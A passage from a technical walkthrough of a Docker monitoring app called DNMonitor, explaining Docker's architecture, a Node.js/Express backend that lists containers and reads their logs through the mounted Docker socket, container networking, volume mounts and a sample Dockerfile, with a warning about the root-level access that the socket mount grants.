    ↓ Resolves service name to container IP
Returns: 172.18.0.3 (internal Docker network IP)
    ↓
Connection established via bridge network
```

---

## 3. Docker & Containerization Deep Dive

### 3.1 Docker Architecture Components

```
┌───────────────────────────────────────────────────────────┐
│                    DOCKER CLIENT                          │
│  (docker CLI, docker-compose, Docker Desktop UI)         │
└───────────────────────────────────────────────────────────┘
                         ↓ REST API over Unix socket
┌───────────────────────────────────────────────────────────┐
│                    DOCKER DAEMON (dockerd)                │
│  • Listens on /var/run/docker.sock                       │
│  • Manages images, containers, networks, volumes         │
│  • Implements Docker API                                 │
└───────────────────────────────────────────────────────────┘
                         ↓ gRPC
┌───────────────────────────────────────────────────────────┐
│                    CONTAINERD                             │
│  • Container lifecycle management                         │
│  • Image management                                       │
│  • Storage and network attachment                        │
└───────────────────────────────────────────────────────────┘
                         ↓ 
┌───────────────────────────────────────────────────────────┐
│                    RUNC                                   │
│  • Low-level container runtime                           │
│  • Creates and runs containers according to OCI spec     │
│  • Sets up namespaces and cgroups                        │
└───────────────────────────────────────────────────────────┘
                         ↓
┌───────────────────────────────────────────────────────────┐
│                    LINUX KERNEL                           │
│  • Namespaces, cgroups, capabilities                     │
│  • Actual process isolation                              │
└───────────────────────────────────────────────────────────┘
```

### 3.2 Dockerode: Node.js Docker API Client

**What DNMonitor's backend uses:**

```javascript
// Conceptual implementation of what's in backend/src/index.js

const Docker = require('dockerode');

// Connect to Docker daemon via Unix socket
const docker = new Docker({
  socketPath: '/var/run/docker.sock'  // Mounted from host
});

// This is what happens under the hood:
app.get('/api/containers', async (req, res) => {
  try {
    // Dockerode makes HTTP request to Docker API
    // GET /containers/json via Unix socket
    const containers = await docker.listContainers({ all: true });
    
    // Docker daemon returns JSON with container info
    const formatted = containers.map(container => ({
      id: container.Id,
      name: container.Names[0].replace('/', ''),
      image: container.Image,
      state: container.State,  // "running" or "exited"
      ports: container.Ports.map(p => ({
        private: p.PrivatePort,
        public: p.PublicPort,
        type: p.Type
      }))
    }));
    
    res.json(formatted);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/containers/:id/logs', async (req, res) => {
  try {
    const container = docker.getContainer(req.params.id);
    
    // Stream logs from container
    // This reads from container's STDOUT/STDERR
    const logStream = await container.logs({
      stdout: true,
      stderr: true,
      tail: 10,  // Last 10 lines
      follow: false
    });
    
    res.send(logStream.toString('utf8'));
  } catch (error) {
    res.status(500).send(error.message);
  }
});
```

**Docker API Communication:**
```
Node.js App (Dockerode)
    ↓ HTTP over Unix Socket
    ↓ Request: GET /v1.41/containers/json?all=1
Docker Daemon
    ↓ Queries containerd
Containerd
    ↓ Reads container state from disk/memory
    ↓ Response: JSON with container metadata
    ↑
Node.js App receives response
```

### 3.3 Docker Networking Deep Dive

**DNMonitor uses bridge networking:**

```
Host Machine (Your Computer)
├── eth0 (Physical network: 192.168.1.100)
│
└── docker0 (Bridge: 172.17.0.1)
    │
    ├── veth1234 → Frontend Container (172.17.0.2)
    ├── veth5678 → Backend Container (172.17.0.3)
    └── veth9abc → NGINX Container (172.17.0.4)
```

**How containers communicate:**

1. **Internal Network (default bridge):**
   ```
   docker-compose creates a network: dnmonitor_default
   
   All services on this network can resolve each other by name:
   - backend → resolves to 172.18.0.3
   - frontend → resolves to 172.18.0.2
   - nginx → resolves to 172.18.0.4
   ```

2. **Port Publishing:**
   ```yaml
   nginx:
     ports:
       - "80:80"  # Host:Container
   
   This creates iptables rules:
   iptables -t nat -A DOCKER -p tcp --dport 80 -j DNAT \
     --to-destination 172.18.0.4:80
   ```

3. **Traffic Flow:**
   ```
   External request to localhost:80
       ↓ iptables NAT rule
   Routed to 172.18.0.4:80 (NGINX container)
       ↓ nginx.conf proxy_pass
   Forwarded to backend:4000 (DNS resolves to 172.18.0.3:4000)
       ↓ Application logic
   Response flows back through same path
   ```

### 3.4 Volume Mounts: The Secret to Hot Reload

**Two types of mounts in DNMonitor:**

1. **Bind Mount (Development - Frontend):**
   ```yaml
   frontend:
     volumes:
       - ./frontend:/app  # Host path : Container path
   ```
   
   ```
   Host Filesystem              Container Filesystem
   ┌─────────────────┐          ┌─────────────────┐
   │ /home/user/     │          │ /                │
   │  DNMonitor/     │          │ ├── bin/         │
   │  ├── frontend/  │  ←─────→ │ ├── app/  ←──┐  │
   │  │  ├── App.js  │  SAME    │ │  ├── App.js│  │
   │  │  ├── ...     │  FILES   │ │  └── ... ────┘  │
   │  └── backend/   │          │ └── usr/         │
   └─────────────────┘          └─────────────────┘
   ```
   
   **Why hot reload works:**
   - Metro bundler (Expo) watches files in /app
   - When you edit App.js on host, change is INSTANT in container
   - Metro detects change, recompiles, pushes update to browser

2. **Named Volume (Production - Persistence):**
   ```yaml
   backend:
     volumes:
       - backend-data:/app/data
   ```
   
   Managed by Docker, stored in:
   `/var/lib/docker/volumes/dnmonitor_backend-data/_data`

3. **Unix Socket Mount (Backend - Docker Access):**
   ```yaml
   backend:
     volumes:
       - /var/run/docker.sock:/var/run/docker.sock
   ```
   
   **CRITICAL SECURITY CONSIDERATION:**
   This gives backend ROOT access to Docker daemon!
   It can:
   - Start/stop any container
   - Access any volume
   - Read sensitive environment variables
   - Execute commands in any container

---

## 4. Backend Architecture Analysis

### 4.1 Backend Stack

```
┌────────────────────────────────────────────────────┐
│               Backend Container                     │
│                                                     │
│  ┌──────────────────────────────────────────────┐  │
│  │           Node.js Runtime (v18)              │  │
│  │  ┌────────────────────────────────────────┐  │  │
│  │  │        Express.js Framework            │  │  │
│  │  │  ┌──────────────────────────────────┐  │  │  │
│  │  │  │    Route Handlers                │  │  │  │
│  │  │  │  • GET /api/containers           │  │  │  │
│  │  │  │  • GET /api/containers/:id/logs  │  │  │  │
│  │  │  │  • GET /health                   │  │  │  │
│  │  │  └──────────────────────────────────┘  │  │  │
│  │  │  ┌──────────────────────────────────┐  │  │  │
│  │  │  │    Middleware                    │  │  │  │
│  │  │  │  • CORS                          │  │  │  │
│  │  │  │  • JSON body parser              │  │  │  │
│  │  │  │  • Error handling                │  │  │  │
│  │  │  └──────────────────────────────────┘  │  │  │
│  │  └────────────────────────────────────────┘  │  │
│  │  ┌────────────────────────────────────────┐  │  │
│  │  │         Dockerode Client               │  │  │
│  │  │  • Connects to Docker API              │  │  │
│  │  │  • Sends HTTP over Unix socket         │  │  │
│  │  └────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────┘  │
│               ↓                                     │
│  /var/run/docker.sock (mounted from host)         │
└────────────────────────────────────────────────────┘
```

### 4.2 Backend Dockerfile Analysis

**Conceptual Backend Dockerfile:**

```dockerfile
# Stage 1: Base image
FROM node:18-alpine
# Why Alpine? Minimal image (~50MB vs ~300MB for full node)
# Contains: Node.js, npm, basic Unix utilities

# Set working directory
WORKDIR /app
# Creates /app if doesn't exist
# All subsequent commands run from /app

# Copy dependency files
COPY package*.json ./
# Why separate? Docker layer caching!
# If only src changes, this layer is reused

# Install dependencies
RUN npm ci --only=production
# npm ci: Clean install (faster, more reliable than npm install)
# --only=production: Excludes devDependencies

# Copy application source
COPY src/ ./src/
# Now copy actual code

# Expose port (documentation only)
EXPOSE 4000
# Doesn't actually publish port, just documents intent

# Health check
HEALTHCHECK --interval=30s --timeout=3s \
  CMD node -e "require('http').get('http://localhost:4000/health', (r) => process.exit(r.statusCode === 200 ? 0 : 1))"
# Docker will run this every 30s to check if container is healthy

# Start application
CMD ["node", "src/index.js"]
# Not RUN (which executes at build time)
# CMD executes when container starts
```

### 4.3 Express.js Architecture

**Request/Response Cycle:**

```javascript
// Simplified backend/src/index.js

const express = require('express');
const Docker = require('dockerode');
const cors = require('cors');

const app = express();
const docker = new Docker({ socketPath: '/var/run/docker.sock' });

// Middleware stack (executes in order)
app.use(cors({
  origin: '*',  // Allow all origins (dev only!)
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  credentials: true
}));

app.use(express.json());  // Parse JSON request bodies

// Logging middleware (custom)
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  next();  // Pass to next middleware
});

// Route: List all containers
app.get('/api/containers', async (req, res, next) => {
  try {
    // Dockerode makes Unix socket HTTP request:
    // GET /v1.41/containers/json?all=1
    const containers = await docker.listContainers({ 
      all: true,  // Include stopped containers
      size: true  // Include size info
    });
    
    const formatted = containers.map(c => ({
      id: c.Id.substring(0, 12),  // Short ID
      name: c.Names[0].replace(/^\//, ''),  // Remove leading /
      image: c.Image,
      state: c.State,
      status: c.Status,
      ports: c.Ports.map(p => ({
        private: p.PrivatePort,
        public: p.PublicPort || null,
        type: p.Type
      })),
      created: c.Created
    }));
    
    res.json(formatted);
  } catch (error) {
    next(error);  // Pass to error handler
  }
});

// Route: Get container logs
app.get('/api/containers/:id/logs', async (req, res, next) => {
  try {
    const container = docker.getContainer(req.params.id);
    
    // Check if container exists
    await container.inspect();
    
    // Fetch logs (last 10 lines)
    const logStream = await container.logs({
      stdout: true,
      stderr: true,
      tail: 10,
      timestamps: true,
      follow: false  // Don't stream, just fetch
    });
    
    // Docker log format: 8-byte header + message
    // We need to strip the header
    const logs = logStream.toString('utf8');
    
    res.type('text/plain').send(logs);
  } catch (error) {
    if (error.statusCode === 404) {
      return res.status(404).json({ error: 'Container not found' });
    }
    next(error);
  }
});

// Health check endpoint
app.get('/health', (req, res) => {
  res.json({ 
    status: 'healthy', 
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});

// Error handling middleware (must be last)
app.use((err, req, res, next) => {
  console.error('Error:', err);
  res.status(err.statusCode || 500).json({
    error: err.message || 'Internal server error',
    timestamp: new Date().toISOString()
  });
});

// Start server
const PORT = process.env.PORT || 4000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Backend listening on port ${PORT}`);
  console.log(`Connected to Docker at ${docker.modem.socketPath}`);
});
```

### 4.4 Docker API Communication

**Under the hood of `docker.listContainers()`:**

```
Node.js (Dockerode)
    ↓ Creates HTTP request
    ↓
┌────────────────────────────────────────────┐
│ Request:                                   │
│ GET /v1.41/containers/json?all=1 HTTP/1.1  │
│ Host: localhost                            │
│ User-Agent: dockerode/3.x.x                │
│ Accept: application/json                   │
└────────────────────────────────────────────┘
    ↓ Sent over Unix socket
/var/run/docker.sock
    ↓
Docker Daemon (dockerd)
    ↓ Queries containerd
    ↓ Reads container state
    ↓
┌────────────────────────────────────────────┐
│ Response:                                  │
│ HTTP/1.1 200 OK                            │
│ Content-Type: application/json             │
│                                            │
│ [                                          │
│   {                                        │
│     "Id": "abc123...",                     │
│     "Names": ["/dnmonitor-backend"],       │
│     "Image": "dnmonitor-backend:latest",   │
│     "State": "running",                    │
│     "Status": "Up 2 hours",                │
│     "Ports": [...]                         │
│   }                                        │
│ ]                                          │
└────────────────────